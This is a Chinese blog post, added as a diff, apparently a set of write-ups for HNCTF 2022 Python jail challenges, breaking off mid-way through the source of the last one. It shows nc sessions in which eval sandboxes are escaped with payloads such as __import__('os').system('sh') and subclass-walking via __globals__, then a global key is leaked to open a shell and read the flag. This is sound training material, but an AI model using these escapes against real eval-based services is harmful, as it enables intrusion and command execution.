@@ -1,0 +1,710 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.png">
+  <link rel="icon" href="/img/avatar.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="xiaocai">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="[HNCTF 2022 WEEK2]calc_jail_beginner_level5(JAIL)123456789101112131415161718192021 nc node5.anna.nssctf.cn 28780  _                _                           _       _ _ _                _ _____ | |">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pyjail下">
+<meta property="og:url" content="http://xiaoxiaoxiaoxiaocai.github.io.com/2024/03/04/Pyjail%E4%B8%8B/index.html">
+<meta property="og:site_name" content="xiaocai">
+<meta property="og:description" content="[HNCTF 2022 WEEK2]calc_jail_beginner_level5(JAIL)123456789101112131415161718192021 nc node5.anna.nssctf.cn 28780  _                _                           _       _ _ _                _ _____ | |">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-03-04T12:34:53.000Z">
+<meta property="article:modified_time" content="2024-03-05T12:15:11.172Z">
+<meta property="article:author" content="xiaocai">
+<meta property="article:tag" content="Python">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>Pyjail下 - xiaocai</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xiaoxiaoxiaoxiaocai.github.io.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Xiaocai&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/wallhaven-d6v3jo_1920x1080.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Pyjail下"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-03-04 20:34" pubdate>
+          March 4, 2024 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          14k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          117 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Pyjail下</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="HNCTF-2022-WEEK2-calc-jail-beginner-level5-JAIL"><a href="#HNCTF-2022-WEEK2-calc-jail-beginner-level5-JAIL" class="headerlink" title="[HNCTF 2022 WEEK2]calc_jail_beginner_level5(JAIL)"></a>[HNCTF 2022 WEEK2]calc_jail_beginner_level5(JAIL)</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs py"> nc node5.anna.nssctf.cn <span class="hljs-number">28780</span><br><br>  _                _                           _       _ _ _                _ _____<br> | |              (_)                         (_)     (_) | |              | | ____|<br> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| | |__<br> | <span class="hljs-string">&#x27;_ \ / _ \/ _` | | &#x27;</span>_ \| <span class="hljs-string">&#x27;_ \ / _ \ &#x27;</span>__|   | |/ _` | | | |/ _ \ \ / / _ \ |___ \<br> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\ V /  __/ |___) |<br> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_|_|\___| \_/ \___|_|____/<br>              __/ |                          _/ |<br>             |___/                          |__/                                       <br><br><br>It<span class="hljs-string">&#x27;s so easy challenge!</span><br><span class="hljs-string">Seems flag into the dir()</span><br><span class="hljs-string">&gt; __import__(&#x27;</span>os<span class="hljs-string">&#x27;).system(&#x27;</span>sh<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">sh: 0: can&#x27;</span>t access tty; job control turned off<br>$ ls<br>__pycache__  flag  load_flag.py  server.py<br>$ cat flag<br>flag=NSSCTF&#123;9f2a7297-f41f-4c04-896d-9384cc5e1b49&#125;<br><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="HNCTF-2022-WEEK2-calc-jail-beginner-level5-1-JAIL"><a href="#HNCTF-2022-WEEK2-calc-jail-beginner-level5-1-JAIL" class="headerlink" title="[HNCTF 2022 WEEK2]calc_jail_beginner_level5.1(JAIL)"></a>[HNCTF 2022 WEEK2]calc_jail_beginner_level5.1(JAIL)</h3><p>先试一下 上一个的payload，发现import未被定义。</p>
+<p>而dir()发现[‘<strong>builtins</strong>‘, ‘my_flag’]，则builtins还在</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs py"> nc node5.anna.nssctf.cn <span class="hljs-number">28475</span><br><br>  _                _                           _       _ _ _                _ _____ __<br> | |              (_)                         (_)     (_) | |              | | ____/_ |<br> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| | |__  | |<br> | <span class="hljs-string">&#x27;_ \ / _ \/ _` | | &#x27;</span>_ \| <span class="hljs-string">&#x27;_ \ / _ \ &#x27;</span>__|   | |/ _` | | | |/ _ \ \ / / _ \ |___ \ | |<br> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\ V /  __/ |___) || |<br> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_|_|\___| \_/ \___|_|____(_)_|<br>              __/ |                          _/ |<br>             |___/                          |__/<br><br><br>It<span class="hljs-string">&#x27;s so easy challenge!</span><br><span class="hljs-string">Seems flag into the dir()</span><br><span class="hljs-string">&gt; __builtins__</span><br><span class="hljs-string">Traceback (most recent call last):</span><br><span class="hljs-string">  File &quot;/home/ctf/./server.py&quot;, line 42, in &lt;module&gt;</span><br><span class="hljs-string">  File &quot;/home/ctf/./server.py&quot;, line 31, in main</span><br><span class="hljs-string">  File &quot;/home/ctf/./server.py&quot;, line 39, in repl</span><br><span class="hljs-string">  File &quot;&lt;string&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="hljs-string">  File &quot;/usr/lib/python3.10/_sitebuiltins.py&quot;, line 61, in __repr__</span><br><span class="hljs-string">  File &quot;/usr/lib/python3.10/_sitebuiltins.py&quot;, line 50, in __setup</span><br><span class="hljs-string">NameError: name &#x27;</span><span class="hljs-built_in">open</span><span class="hljs-string">&#x27; is not defined</span><br></code></pre></td></tr></table></figure>
+
+<p>发现open被删了</p>
+<p>那就Show subclasses with tuple</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs py">nc node5.anna.nssctf.cn <span class="hljs-number">28475</span><br><br>  _                _                           _       _ _ _                _ _____ __<br> | |              (_)                         (_)     (_) | |              | | ____/_ |<br> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| | |__  | |<br> | <span class="hljs-string">&#x27;_ \ / _ \/ _` | | &#x27;</span>_ \| <span class="hljs-string">&#x27;_ \ / _ \ &#x27;</span>__|   | |/ _` | | | |/ _ \ \ / / _ \ |___ \ | |<br> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\ V /  __/ |___) || |<br> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_|_|\___| \_/ \___|_|____(_)_|<br>              __/ |                          _/ |<br>             |___/                          |__/<br><br><br>It<span class="hljs-string">&#x27;s so easy challenge!</span><br><span class="hljs-string">Seems flag into the dir()</span><br><span class="hljs-string">&gt; ().__class__.__base__.__subclasses__()</span><br></code></pre></td></tr></table></figure>
+
+<p>在倒数第六个发现 &lt;class ‘os._wrap_close’&gt;</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs py"> nc node5.anna.nssctf.cn <span class="hljs-number">28475</span><br><br>  _                _                           _       _ _ _                _ _____ __<br> | |              (_)                         (_)     (_) | |              | | ____/_ |<br> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| | |__  | |<br> | <span class="hljs-string">&#x27;_ \ / _ \/ _` | | &#x27;</span>_ \| <span class="hljs-string">&#x27;_ \ / _ \ &#x27;</span>__|   | |/ _` | | | |/ _ \ \ / / _ \ |___ \ | |<br> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\ V /  __/ |___) || |<br> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_|_|\___| \_/ \___|_|____(_)_|<br>              __/ |                          _/ |<br>             |___/                          |__/<br><br><br>It<span class="hljs-string">&#x27;s so easy challenge!</span><br><span class="hljs-string">Seems flag into the dir()</span><br><span class="hljs-string">&gt; ().__class__.__base__.__subclasses__()[-6].__init__.__globals__[&#x27;</span>system<span class="hljs-string">&#x27;](&#x27;</span>sh<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">sh: 0: can&#x27;</span>t access tty; job control turned off<br>$ ls<br>__pycache__  flag  load_flag.py  server.py<br>$ cat  flag<br>flag=NSSCTF&#123;18906d38-0c29-415c-bfd6-3c1dcd9bb031&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="HNCTF-2022-Week1-lake-lake-lake-JAIL"><a href="#HNCTF-2022-Week1-lake-lake-lake-JAIL" class="headerlink" title="[HNCTF 2022 Week1]lake lake lake(JAIL)"></a>[HNCTF 2022 Week1]lake lake lake(JAIL)</h3><p>得到附件</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#it seems have a backdoor</span><br><span class="hljs-comment">#can u find the key of it and use the backdoor</span><br><br>fake_key_var_in_the_local_but_real_in_the_remote = <span class="hljs-string">&quot;[DELETED]&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>():<br>    code = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(code)&gt;<span class="hljs-number">9</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;you&#x27;re hacker!&quot;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">eval</span>(code))<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">backdoor</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Please enter the admin key&quot;</span>)<br>    key = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>    <span class="hljs-keyword">if</span>(key == fake_key_var_in_the_local_but_real_in_the_remote):<br>        code = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">eval</span>(code))<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Nooo!!!!&quot;</span>)<br><br>WELCOME = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">  _       _          _       _          _       _        </span><br><span class="hljs-string"> | |     | |        | |     | |        | |     | |       </span><br><span class="hljs-string"> | | __ _| | _____  | | __ _| | _____  | | __ _| | _____ </span><br><span class="hljs-string"> | |/ _` | |/ / _ \ | |/ _` | |/ / _ \ | |/ _` | |/ / _ \</span><br><span class="hljs-string"> | | (_| |   &lt;  __/ | | (_| |   &lt;  __/ | | (_| |   &lt;  __/</span><br><span class="hljs-string"> |_|\__,_|_|\_\___| |_|\__,_|_|\_\___| |_|\__,_|_|\_\___|                                                                                                                                                                     </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(WELCOME)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Now the program has two functions&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;can you use dockerdoor&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1.func&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;2.backdoor&quot;</span>)<br>input_data = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt; &quot;</span>)<br><span class="hljs-keyword">if</span>(input_data == <span class="hljs-string">&quot;1&quot;</span>):<br>    func()<br>    exit(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">elif</span>(input_data == <span class="hljs-string">&quot;2&quot;</span>):<br>    backdoor()<br>    exit(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;not found the choice&quot;</span>)<br>    exit(<span class="hljs-number">0</span>)<br><br></code></pre></td></tr></table></figure>
+
+<p>这道题的逻辑是输入1和2分别执行func函数和backdoor函数</p>
+<p>func函数有长度限制，backdoor函数没有但是得得到key的值，key显然是一个全局变量，你在func函数输入globals</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs py"> nc node5.anna.nssctf.cn <span class="hljs-number">28632</span><br><br>  _       _          _       _          _       _<br> | |     | |        | |     | |        | |     | |<br> | | __ _| | _____  | | __ _| | _____  | | __ _| | _____<br> | |/ _` | |/ / _ \ | |/ _` | |/ / _ \ | |/ _` | |/ / _  | | (_| |   &lt;  __/ | | (_| |   &lt;  __/ | | (_| |   &lt;  __/<br> |_|\__,_|_|\_\___| |_|\__,_|_|\_\___| |_|\__,_|_|\_\___|<br><br><br>Now the program has two functions<br>can you use dockerdoor<br><span class="hljs-number">1.</span>func<br><span class="hljs-number">2.</span>backdoor<br>&gt; <span class="hljs-number">1</span><br>&gt;<span class="hljs-built_in">globals</span>()<br>&#123;<span class="hljs-string">&#x27;__name__&#x27;</span>: <span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;__doc__&#x27;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;__package__&#x27;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;__loader__&#x27;</span>: &lt;_frozen_importlib_external.SourceFileLoader <span class="hljs-built_in">object</span> at <span class="hljs-number">0x7f5d28848a90</span>&gt;, <span class="hljs-string">&#x27;__spec__&#x27;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;__annotations__&#x27;</span>: &#123;&#125;, <span class="hljs-string">&#x27;__builtins__&#x27;</span>: &lt;module <span class="hljs-string">&#x27;builtins&#x27;</span> (built-<span class="hljs-keyword">in</span>)&gt;, <span class="hljs-string">&#x27;__file__&#x27;</span>: <span class="hljs-string">&#x27;/home/ctf/./server.py&#x27;</span>, <span class="hljs-string">&#x27;__cached__&#x27;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;key_9b1d015375213e21&#x27;</span>: <span class="hljs-string">&#x27;a34af94e88aed5c34fb5ccfe08cd14ab&#x27;</span>, <span class="hljs-string">&#x27;func&#x27;</span>: &lt;function func at <span class="hljs-number">0x7f5d289e7d90</span>&gt;, <span class="hljs-string">&#x27;backdoor&#x27;</span>: &lt;function backdoor at <span class="hljs-number">0x7f5d288a9fc0</span>&gt;, <span class="hljs-string">&#x27;WELCOME&#x27;</span>: <span class="hljs-string">&#x27;\n  _       _          _       _          _       _        \n | |     | |        | |     | |        | |     | |       \n | | __ _| | _____  | | __ _| | _____  | | __ _| | _____ \n | |/ _` | |/ / _ \\ | |/ _` | |/ / _ \\ | |/ _` | |/ / _  | | (_| |   &lt;  __/ | | (_| |   &lt;  __/ | | (_| |   &lt;  __/\n |_|\\__,_|_|\\_\\___| |_|\\__,_|_|\\_\\___| |_|\\__,_|_|\\_\\___|</span><br><span class="hljs-string"></span><br><span class="hljs-string">                            \n&#x27;</span>, <span class="hljs-string">&#x27;input_data&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>得到key’的值： ‘a34af94e88aed5c34fb5ccfe08cd14ab’</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs py"><br>nc node5.anna.nssctf.cn <span class="hljs-number">28632</span><br><br>  _       _          _       _          _       _<br> | |     | |        | |     | |        | |     | |<br> | | __ _| | _____  | | __ _| | _____  | | __ _| | _____<br> | |/ _` | |/ / _ \ | |/ _` | |/ / _ \ | |/ _` | |/ / _  | | (_| |   &lt;  __/ | | (_| |   &lt;  __/ | | (_| |   &lt;  __/<br> |_|\__,_|_|\_\___| |_|\__,_|_|\_\___| |_|\__,_|_|\_\___|<br><br><br>Now the program has two functions<br>can you use dockerdoor<br><span class="hljs-number">1.</span>func<br><span class="hljs-number">2.</span>backdoor<br>&gt; <span class="hljs-number">2</span><br>Please enter the admin key<br>&gt;a34af94e88aed5c34fb5ccfe08cd14ab<br>&gt;<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;sh&#x27;</span>)<br>sh: <span class="hljs-number">0</span>: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ ls</span><br><span class="hljs-string">flag  server.py</span><br><span class="hljs-string">$ cat flag</span><br><span class="hljs-string">flag=NSSCTF&#123;da5f4f8a-3839-4c3c-9dd6-60de30fe299e&#125;</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="HNCTF-2022-Week1-l-ke-l-ke-l-ke-JAIL"><a href="#HNCTF-2022-Week1-l-ke-l-ke-l-ke-JAIL" class="headerlink" title="[HNCTF 2022 Week1]l@ke l@ke l@ke(JAIL)"></a>[HNCTF 2022 Week1]l@ke l@ke l@ke(JAIL)</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#it seems have a backdoor as `lake lake lake`</span><br><span class="hljs-comment">#but it seems be limited!</span><br><span class="hljs-comment">#can u find the key of it and use the backdoor</span><br><br>fake_key_var_in_the_local_but_real_in_the_remote = <span class="hljs-string">&quot;[DELETED]&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>():<br>    code = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(code)&gt;<span class="hljs-number">6</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;you&#x27;re hacker!&quot;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">eval</span>(code))<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">backdoor</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Please enter the admin key&quot;</span>)<br>    key = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>    <span class="hljs-keyword">if</span>(key == fake_key_var_in_the_local_but_real_in_the_remote):<br>        code = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-built_in">print</span>(<span 